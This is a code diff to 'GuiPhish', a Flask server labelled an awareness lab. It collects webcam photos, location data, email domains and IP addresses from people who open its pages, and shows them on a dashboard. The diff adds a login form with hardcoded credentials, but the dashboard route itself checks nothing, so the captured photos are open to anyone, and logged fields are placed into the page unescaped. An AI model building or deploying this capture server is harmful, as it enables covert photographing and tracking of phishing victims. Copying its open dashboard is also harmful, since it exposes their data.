@@ -2,48 +2,14 @@ import os
 import json
 import shutil
 import random
+import base64
 from datetime import datetime
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, redirect
 from flask_cors import CORS
 
-DASHBOARD_PIN = "guiphish"
-
-BANNERS = [
-r"""
-  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
- ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
- ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
- ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
- ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
-  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
-
-        🔐 GuiPhish Awareness Lab
-""",
-
-r"""
-   ▄████  █    ██  ██▓ ██▓███
-        📊 Awareness • Logs • Reports
-""",
-
-r"""
-        👁️ Browser Permission Lab
-        📡 Camera • Location • Email
-""",
-
-r"""
-        🔐 GuiPhish Toolkit
-        🧠 Security Education
-""",
-
-r"""
-        🎣 Social Engineering Lab
-        🌍 Simulation
-""",
-
-r"""
-        📸 Camera | 🌍 Location | 📧 Email
-"""
-]
+# 🔐 CONFIG
+DASHBOARD_USER = "admin"
+DASHBOARD_PASS = "guiphish"
 
 app = Flask(__name__)
 CORS(app)
@@ -52,7 +18,7 @@ PASTAS = ["logs", "fotos", "relatorios"]
 for pasta in PASTAS:
     os.makedirs(pasta, exist_ok=True)
 
-# ================= LOGS =================
+# ================= LOG =================
 
 def ler_eventos():
     caminho = "logs/eventos.jsonl"
@@ -68,56 +34,6 @@ def ler_eventos():
                 pass
     return eventos
 
-def mostrar_logs():
-    eventos = ler_eventos()
-
-    print("\n📊 Últimos eventos:\n")
-
-    for e in eventos[-10:]:
-        print(f"{e['tipo']} | {e['status']} | {e['ip']}")
-
-# ================= RELATÓRIO =================
-
-def gerar_relatorio():
-    eventos = ler_eventos()
-
-    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-
-    with open(nome, "w", encoding="utf-8") as f:
-        f.write("Relatório GuiPhish\n\n")
-        for e in eventos:
-            f.write(json.dumps(e, ensure_ascii=False) + "\n")
-
-    print(f"[+] Relatório salvo: {nome}")
-
-# ================= LIMPEZA =================
-
-def limpar():
-    confirm = input("Digite SIM para apagar tudo: ")
-
-    if confirm != "SIM":
-        return
-
-    for pasta in PASTAS:
-        shutil.rmtree(pasta)
-        os.makedirs(pasta)
-
-    print("[+] Limpo")
-
-# ================= MENU =================
-
-def menu():
-    print("\nGuiPhish\n")
-    print("1) Camera")
-    print("2) Localização")
-    print("3) Logs")
-    print("4) Relatório")
-    print("5) Limpar")
-    print("6) Email")
-    print("7) Sair")
-
-    return input("Opção: ")
-
 # ================= ROTAS =================
 
 @app.route("/")
@@ -125,54 +41,92 @@ def index():
     return send_file("index.html")
 
 @app.route("/email")
-def email_page():
+def email():
     return send_file("email.html")
 
 @app.route("/foto/<nome>")
 def foto(nome):
     return send_file(f"fotos/{nome}")
 
+# ================= LOGIN =================
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        user = request.form.get("user")
+        senha = request.form.get("pass")
+
+        if user == DASHBOARD_USER and senha == DASHBOARD_PASS:
+            return redirect("/dashboard")
+        else:
+            return "<h3 style='color:red'>Login inválido</h3>"
+
+    return """
+    <html>
+    <body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:100px">
+        <h1>🔐 GuiPhish Login</h1>
+        <form method="POST">
+            <input name="user" placeholder="user"><br><br>
+            <input name="pass" type="password" placeholder="senha"><br><br>
+            <button>Entrar</button>
+        </form>
+    </body>
+    </html>
+    """
+
 # ================= DASHBOARD =================
 
 @app.route("/dashboard")
 def dashboard():
-    pin = request.args.get("pin")
-
-    if pin != DASHBOARD_PIN:
-        return "Acesso negado", 403
-
     eventos = ler_eventos()
 
-    fotos = []
-    if os.path.exists("fotos"):
-        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]
+    fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]
 
-    html = """
+    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
+    total_loc = len([e for e in eventos if e.get("tipo") == "localizacao"])
+    total_email = len([e for e in eventos if e.get("tipo") == "email"])
+
+    return f"""
     <html>
-    <body style="background:#0f172a;color:white;font-family:Arial">
+    <head>
+        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    </head>
+
+    <body style="background:#0f172a;color:white;font-family:Arial;padding:20px">
 
     <h1>📊 GuiPhish Dashboard</h1>
 
-    <h2>Fotos</h2>
+    <button onclick="location.reload()">🔄 Atualizar</button>
+    <button onclick="window.location='/login'">🔓 Logout</button>
+
+    <h2>📈 Estatísticas</h2>
+
+    <canvas id="grafico" width="400"></canvas>
+
+    <script>
+    const ctx = document.getElementById('grafico');
+
+    new Chart(ctx, {{
+        type: 'bar',
+        data: {{
+            labels: ['Camera','Localização','Email'],
+            datasets: [{{
+                label: 'Eventos',
+                data: [{total_camera},{total_loc},{total_email}],
+            }}]
+        }}
+    }});
+    </script>
+
+    <h2>📸 Fotos</h2>
+    {"".join([f'<img src="/foto/{f}" width="200">' for f in fotos])}
+
+    <h2>📋 Eventos</h2>
+    {"".join([f"<p>{e.get('tipo')} | {e.get('status')} | {e.get('ip')}</p>" for e in eventos[-20:]])}
+
+    </body>
+    </html>
     """
-
-    for f in fotos:
-        html += f'<img src="/foto/{f}" width="200">'
-
-    html += "<h2>Eventos</h2>"
-
-    for e in eventos[-20:]:
-        html += f"<p>{e.get('tipo')} | {e.get('status')} | {e.get('ip')}</p>"
-
-        if e.get("google_maps") != "N/A":
-            html += f"<a href='{e.get('google_maps')}' target='_blank'>Maps</a><br>"
-
-        if e.get("email_domain") != "N/A":
-            html += f"<p>Email: {e.get('email_domain')}</p>"
-
-    html += "</body></html>"
-
-    return html
 
 # ================= EVENTO =================
 
@@ -203,8 +157,6 @@ def capture():
     data = request.json
 
     img = data.get("image").split(",")[1]
-
-    import base64
     img_bytes = base64.b64decode(img)
 
     nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
@@ -219,34 +171,5 @@ def capture():
 # ================= MAIN =================
 
 if __name__ == "__main__":
-    print(random.choice(BANNERS))
-
-    while True:
-        op = menu()
-
-        if op == "1":
-            app.config["MODO"] = "camera"
-            break
-
-        elif op == "2":
-            app.config["MODO"] = "localizacao"
-            break
-
-        elif op == "3":
-            mostrar_logs()
-
-        elif op == "4":
-            gerar_relatorio()
-
-        elif op == "5":
-            limpar()
-
-        elif op == "6":
-            app.config["MODO"] = "email"
-            print("\nAcesse: /email\n")
-            break
-
-        elif op == "7":
-            exit()
-
+    print("\n🔥 GuiPhish iniciado 🔥\n")
     app.run(host="0.0.0.0", port=10000)
